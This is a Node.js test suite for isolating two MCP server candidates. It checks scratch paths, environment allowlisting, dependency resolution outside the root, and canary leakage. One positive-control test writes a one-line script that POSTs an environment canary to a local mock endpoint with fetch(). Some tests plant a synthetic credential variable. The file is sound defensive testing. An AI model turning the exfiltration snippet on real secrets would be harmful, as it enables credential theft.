// Tests for candidate isolation (plan §2). The named mutations, each proving a guard can fail:
//   * the scratch invariant rejects a path inside the repository;
//   * adding a forbidden credential variable back makes the environment assertion throw;
//   * a CJS-only dependency resolving from OUTSIDE the root fails the resolution check — run
//     against a real child process, because an ESM-only instrument would pass it;
//   * the opposite-SDK probe distinguishes anchor locations (an in-repo anchor resolves the
//     SDK, which is exactly why assembled roots outside the repository exist);
//   * the offline exfiltration channel can actually observe a canary that moves.

import { spawn } from "node:child_process";
import { createServer } from "node:http";
import { mkdtempSync, mkdirSync, writeFileSync, rmSync, realpathSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname, sep } from "node:path";
import { fileURLToPath } from "node:url";
import test, { before, after } from "node:test";
import assert from "node:assert/strict";

import {
  ENV_ALLOWLIST,
  FORBIDDEN_ENV,
  REPO,
  assembleCandidateRoot,
  assertOutsideRepo,
  buildServerEnv,
  checkResolutions,
  resolveFromRoot,
  treeDigest,
} from "./isolate.mjs";

const HERE = dirname(fileURLToPath(import.meta.url));

const roots = {};
before(() => {
  for (const candidate of ["v1", "v2"]) roots[candidate] = assembleCandidateRoot(candidate);
});
after(() => {
  for (const r of Object.values(roots)) r.cleanup();
});

// --- scratch invariant -------------------------------------------------------------------

test("the scratch invariant rejects a path inside the repository and accepts tmpdir", () => {
  assert.throws(() => assertOutsideRepo(join(REPO, ".story")), /inside the repository/);
  assert.doesNotThrow(() => assertOutsideRepo(tmpdir()));
});

// --- environment allowlist ---------------------------------------------------------------

test("the constructed environment contains only allowlisted names plus explicit extras", () => {
  const env = buildServerEnv({ resolveLog: "/tmp/x.ndjson", extra: { SPENDBAR_TEST: "1" } });
  const permitted = new Set([...ENV_ALLOWLIST, "SPENDBAR_RESOLVE_LOG", "SPENDBAR_TEST"]);
  for (const name of Object.keys(env)) {
    assert.ok(permitted.has(name), `unexpected variable in constructed env: ${name}`);
  }
});

test("a parent-environment variable does not leak into the constructed environment", () => {
  process.env.SPENDBAR_PARENT_POLLUTION = "present";
  try {
    assert.ok(!("SPENDBAR_PARENT_POLLUTION" in buildServerEnv({})));
  } finally {
    delete process.env.SPENDBAR_PARENT_POLLUTION;
  }
});

test("a forbidden credential variable present in the PARENT env never reaches the child", () => {
  process.env.GITHUB_TOKEN = "synthetic-parent-value-0000";
  try {
    assert.ok(!("GITHUB_TOKEN" in buildServerEnv({})));
  } finally {
    delete process.env.GITHUB_TOKEN;
  }
});

test("mutation: adding a forbidden credential variable back makes the assertion throw", () => {
  for (const name of FORBIDDEN_ENV) {
    assert.throws(
      () => buildServerEnv({ extra: { [name]: "synthetic-0000" } }),
      new RegExp(name),
      `forbidden variable ${name} was accepted`,
    );
  }
});

// --- resolution checking -----------------------------------------------------------------

async function withTempDir(fn) {
  // Async-aware on purpose: a sync `finally` around an async callback deletes the fixture
  // while the callback is still using it (that exact bug cost test 9 and 14 a run).
  const dir = mkdtempSync(join(tmpdir(), "isolate-fixture-"));
  try {
    return await fn(dir);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
}

test("checkResolutions flags CJS and ESM resolutions outside the root, allows builtins", async () => {
  await withTempDir((dir) => {
    const root = join(dir, "root");
    const outside = join(dir, "elsewhere.js");
    mkdirSync(root);
    writeFileSync(join(root, "inside.js"), "");
    writeFileSync(outside, "");
    const log = join(dir, "log.ndjson");
    writeFileSync(
      log,
      [
        JSON.stringify({ kind: "cjs", request: "fs", resolved: "fs" }),
        JSON.stringify({ kind: "esm", request: "node:path", resolved: "node:path" }),
        JSON.stringify({ kind: "cjs", request: "./inside.js", resolved: join(root, "inside.js") }),
        JSON.stringify({ kind: "cjs", request: "evil-dep", resolved: outside }),
        JSON.stringify({ kind: "esm", request: "evil-esm", resolved: `file://${outside}` }),
      ]
        .map((l) => l + "\n")
        .join(""),
    );
    const r = checkResolutions(log, root);
    assert.equal(r.total, 5);
    assert.equal(r.builtins, 2);
    assert.equal(r.inside, 1);
    assert.deepEqual(
      r.violations.map((v) => v.request).sort(),
      ["evil-dep", "evil-esm"],
    );
  });
});

test("an empty resolution log is an error, not a pass", async () => {
  await withTempDir((dir) => {
    const log = join(dir, "log.ndjson");
    writeFileSync(log, "");
    assert.throws(() => checkResolutions(log, dir), /instrument did not run/);
  });
});

test("a malformed resolution log line is a hard error", async () => {
  await withTempDir((dir) => {
    const log = join(dir, "log.ndjson");
    writeFileSync(log, "{not json\n");
    assert.throws(() => checkResolutions(log, dir));
  });
});

test("mutation: a CJS-only dependency resolving from outside the root fails the live check", async () => {
  // The reason the instrument patches Module._resolveFilename: this fixture's require() never
  // touches the ESM resolve hook, so an ESM-only instrument would record nothing and the
  // check would report a clean run. Node resolution walks upward from root/ and finds the
  // planted package in the PARENT's node_modules — outside the root.
  await withTempDir(async (dir) => {
    const root = join(dir, "root");
    const dep = join(dir, "node_modules", "outside-dep");
    mkdirSync(root, { recursive: true });
    mkdirSync(dep, { recursive: true });
    writeFileSync(join(dep, "package.json"), JSON.stringify({ name: "outside-dep", version: "1.0.0", main: "index.js" }));
    writeFileSync(join(dep, "index.js"), "module.exports = 1;\n");
    // The explicit exit matters: the instrument's module.register() arms an ESM hooks thread,
    // and a CJS entry that never exercises it can leave the process alive on that idle thread.
    // The fixture's work (the recorded require) is synchronous and complete by this line.
    writeFileSync(join(root, "entry.cjs"), 'require("outside-dep");\nprocess.exit(0);\n');
    const log = join(dir, "resolve.ndjson");

    const child = spawn(
      process.execPath,
      ["--import", join(HERE, "instrument.mjs"), join(root, "entry.cjs")],
      { cwd: root, env: { SPENDBAR_RESOLVE_LOG: log }, stdio: ["ignore", "ignore", "pipe"] },
    );
    let stderr = "";
    child.stderr.on("data", (d) => (stderr += d));
    const code = await new Promise((resolve) => {
      const deadline = setTimeout(() => {
        child.kill("SIGKILL");
        resolve("timeout");
      }, 15_000);
      child.on("exit", (c) => {
        clearTimeout(deadline);
        resolve(c);
      });
    });
    assert.equal(code, 0, `fixture child failed (${code}): ${stderr}`);

    const r = checkResolutions(log, root);
    const flagged = r.violations.filter((v) => v.kind === "cjs" && v.request === "outside-dep");
    assert.equal(flagged.length, 1, "the CJS outside-root resolution was not flagged");
  });
});

// --- opposite-SDK probes on the assembled roots ------------------------------------------

test("each candidate root resolves its own SDK entry and MODULE_NOT_FOUNDs the opposite package", () => {
  // Positive controls use the exact specifiers the servers import — v1's bare name is dead in
  // the shipped artifact (next test), so probing it would "prove" absence of a present package.
  // Roots are realpathed because resolution returns realpaths (macOS /var -> /private/var).
  const v1Real = realpathSync(roots.v1.root);
  const own = resolveFromRoot(roots.v1.root, "@modelcontextprotocol/sdk/server/mcp.js");
  assert.ok(own.startsWith(v1Real + sep), "v1's own SDK resolved outside its root");
  assert.throws(() => resolveFromRoot(roots.v1.root, "@modelcontextprotocol/server"), { code: "MODULE_NOT_FOUND" });

  const v2Real = realpathSync(roots.v2.root);
  const own2 = resolveFromRoot(roots.v2.root, "@modelcontextprotocol/server");
  assert.ok(own2.startsWith(v2Real + sep), "v2's own SDK resolved outside its root");
  assert.throws(() => resolveFromRoot(roots.v2.root, "@modelcontextprotocol/sdk"), { code: "MODULE_NOT_FOUND" });
});

test("measured fact: v1 1.30.0's root '.' export maps to files absent from the shipped artifact", () => {
  // @modelcontextprotocol/sdk's exports map points '.' at dist/{esm,cjs}/index.js; the
  // published tarball ships NEITHER, so a bare-name import fails even where the package is
  // installed and its subpaths work. Pinned as a test so the decision document cites a
  // re-checkable fact; if a later SDK version ships the root entry, this fails and the
  // evidence gets updated rather than staying silently stale.
  assert.throws(() => resolveFromRoot(roots.v1.root, "@modelcontextprotocol/sdk"), { code: "MODULE_NOT_FOUND" });
  assert.doesNotThrow(() => resolveFromRoot(roots.v1.root, "@modelcontextprotocol/sdk/server/mcp.js"));
});

test("mutation: anchoring the probe at the in-repo workspace resolves the SDK — absence proofs need the assembled root", () => {
  // This is why §2 rejects the not-found probe as THE proof: an anchor inside the repository
  // can reach candidate (and potentially repo-root) node_modules. The probe only means
  // something from a root with no ancestor trees — which the previous tests use.
  const inRepo = resolveFromRoot(join(HERE, "candidates", "v1"), "@modelcontextprotocol/sdk/server/mcp.js");
  assert.ok(inRepo.includes(`${sep}node_modules${sep}`));
});

// --- tree digest --------------------------------------------------------------------------

test("treeDigest is order-stable and byte-sensitive", async () => {
  await withTempDir((dir) => {
    const a = join(dir, "a");
    const b = join(dir, "b");
    for (const d of [a, b]) {
      mkdirSync(join(d, "nested"), { recursive: true });
      writeFileSync(join(d, "x.txt"), "same");
      writeFileSync(join(d, "nested", "y.txt"), "same");
    }
    assert.equal(treeDigest(a), treeDigest(b));
    writeFileSync(join(b, "nested", "y.txt"), "diff");
    assert.notEqual(treeDigest(a), treeDigest(b));
  });
});

// --- offline exfiltration observation (§2's replacement for the credential canary) ---------

const CANARY = "spendbar-canary-value-000000";

function startMock() {
  return new Promise((resolve) => {
    const hits = [];
    const server = createServer((req, res) => {
      let body = "";
      req.on("data", (d) => (body += d));
      req.on("end", () => {
        hits.push({ url: req.url, body });
        res.end("ok");
      });
    });
    server.listen(0, "127.0.0.1", () => {
      resolve({ url: `http://127.0.0.1:${server.address().port}`, hits, close: () => server.close() });
    });
  });
}

test("a full probe exchange moves no canary: not to the local endpoint, not into any stream", async () => {
  // Scope, stated honestly: this observes the local endpoint (including proxy-respecting
  // egress pointed at it) and the process's own streams. It cannot firewall a raw socket to
  // an arbitrary host; that limit is why the sanitized manifest never carries env VALUES and
  // why real-client runs get only the exact allowlisted environment in the first place.
  const mock = await startMock();
  try {
    for (const candidate of ["v1", "v2"]) {
      const { root, resolveLog } = roots[candidate];
      const env = buildServerEnv({
        resolveLog,
        extra: {
          SPENDBAR_TEST_CANARY: CANARY,
          HTTP_PROXY: mock.url,
          HTTPS_PROXY: mock.url,
          ALL_PROXY: mock.url,
        },
      });
      const child = spawn(process.execPath, ["server.mjs"], { cwd: root, env, stdio: ["pipe", "pipe", "pipe"] });
      let out = "";
      let err = "";
      child.stdout.on("data", (d) => (out += d));
      child.stderr.on("data", (d) => (err += d));
      child.stdin.write(
        JSON.stringify({ jsonrpc: "2.0", id: 1, method: "initialize", params: { protocolVersion: "2025-06-18", capabilities: {}, clientInfo: { name: "exfil-test", version: "0" } } }) + "\n",
      );
      child.stdin.write(JSON.stringify({ jsonrpc: "2.0", method: "notifications/initialized" }) + "\n");
      child.stdin.write(
        JSON.stringify({ jsonrpc: "2.0", id: 2, method: "tools/call", params: { name: "spendbar_probe", arguments: { nonce: "exfil" } } }) + "\n",
      );
      await new Promise((resolve) => setTimeout(resolve, 2000));
      child.stdin.end();
      await new Promise((resolve) => {
        const t = setTimeout(() => {
          child.kill("SIGKILL");
          resolve();
        }, 5000);
        child.on("exit", () => {
          clearTimeout(t);
          resolve();
        });
      });
      assert.ok(out.includes('"exfil"'), `${candidate}: exchange did not complete`);
      assert.ok(!out.includes(CANARY), `${candidate}: canary appeared on stdout`);
      assert.ok(!err.includes(CANARY), `${candidate}: canary appeared on stderr`);
    }
    assert.equal(mock.hits.length, 0, `local endpoint was contacted: ${JSON.stringify(mock.hits)}`);
  } finally {
    mock.close();
  }
});

test("positive control: a process that DOES move the canary is observed at the endpoint", async () => {
  // Without this, the zero-hits assertion above could pass because the channel is deaf.
  const mock = await startMock();
  try {
    await withTempDir(async (dir) => {
      const script = join(dir, "exfiltrate.mjs");
      writeFileSync(
        script,
        'await fetch(process.env.SPENDBAR_EXFIL_URL, { method: "POST", body: process.env.SPENDBAR_TEST_CANARY });\n',
      );
      const child = spawn(process.execPath, [script], {
        env: { SPENDBAR_TEST_CANARY: CANARY, SPENDBAR_EXFIL_URL: mock.url },
        stdio: ["ignore", "ignore", "pipe"],
      });
      let stderr = "";
      child.stderr.on("data", (d) => (stderr += d));
      const code = await new Promise((resolve) => child.on("exit", resolve));
      assert.equal(code, 0, `positive-control child failed: ${stderr}`);
    });
    assert.equal(mock.hits.length, 1);
    assert.ok(mock.hits[0].body.includes(CANARY), "the endpoint saw a request but not the canary");
  } finally {
    mock.close();
  }
});
